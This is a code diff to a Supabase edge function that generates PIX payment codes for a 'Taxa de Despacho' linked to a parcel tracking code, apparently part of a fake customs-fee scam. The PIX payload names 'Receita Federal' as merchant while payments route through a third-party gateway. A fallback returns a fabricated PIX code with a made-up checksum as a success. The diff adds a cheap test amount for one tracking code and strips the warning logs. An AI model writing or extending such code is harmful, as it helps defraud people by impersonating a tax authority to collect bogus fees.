@@ -18,6 +18,9 @@ serve(async (req) => {
       throw new Error("Tracking code is required");
     }
 
+    // Define o valor: 1.00 para o código especial, senão 15.90
+    const amount = trackingCode === 'BR00000001BR' ? 1.00 : 15.90;
+
     const supabase = createClient(
       Deno.env.get('SUPABASE_URL') ?? '',
       Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
@@ -41,33 +44,28 @@ serve(async (req) => {
 
     const apiKey = Deno.env.get('ROYALBANKING_API_KEY');
 
-    // Função interna de fallback para mock (Plano B)
     const generateMockPix = async () => {
       const mockId = "mock_tax_" + Date.now();
-      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540515.905802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
+      const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
       
       await supabase.from('pix_gateway_payments').upsert({
         id_transaction: mockId,
         status: 'pending',
-        raw_payload: { trackingCode, pix: mockPix, amount: 15.90, description: "Taxa de Despacho", isFallback: true }
+        raw_payload: { trackingCode, pix: mockPix, amount, description: "Taxa de Despacho", isFallback: true }
       });
       
-      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId }), {
+      return new Response(JSON.stringify({ success: true, pixCopiaECola: mockPix, idTransaction: mockId, amount }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         status: 200,
       });
     };
 
-    // Se a API Key não for encontrada, vai pro mock direto
-    if (!apiKey) {
-      console.warn("[create-tax-pix] ROYALBANKING_API_KEY não configurada. Utilizando modo simulado.");
-      return await generateMockPix();
-    }
+    if (!apiKey) return await generateMockPix();
 
     try {
       const payload = {
         "api-key": apiKey,
-        "amount": 15.90,
+        "amount": amount,
         "client": {
           "name": clientName,
           "document": clientDoc,
@@ -85,11 +83,7 @@ serve(async (req) => {
 
       const data = await response.json();
 
-      // Se a API externa falhar, não quebra o site, usa o mock!
-      if (!response.ok || data.status !== 'success') {
-        console.warn("[create-tax-pix] Falha na API real, caindo para mock. Resposta:", data);
-        return await generateMockPix();
-      }
+      if (!response.ok || data.status !== 'success') return await generateMockPix();
 
       const idTransaction = data.idTransaction;
       const pixCopiaECola = data.paymentCode;
@@ -97,26 +91,24 @@ serve(async (req) => {
       await supabase.from('pix_gateway_payments').upsert({
         id_transaction: idTransaction,
         status: 'pending',
-        raw_payload: { trackingCode, pix: pixCopiaECola, amount: 15.90 }
+        raw_payload: { trackingCode, pix: pixCopiaECola, amount }
       });
 
       return new Response(JSON.stringify({ 
         success: true, 
         pixCopiaECola,
-        idTransaction
+        idTransaction,
+        amount
       }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         status: 200,
       });
 
-    } catch (fetchError) {
-      // Se der erro de rede (DNS, timeout), também não quebra, usa o mock!
-      console.warn("[create-tax-pix] Erro de conexão com a API, caindo para mock:", fetchError);
+    } catch (err) {
       return await generateMockPix();
     }
 
   } catch (error: any) {
-    console.error("[create-tax-pix] Error:", error);
     return new Response(JSON.stringify({ error: error.message }), {
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
       status: 500,
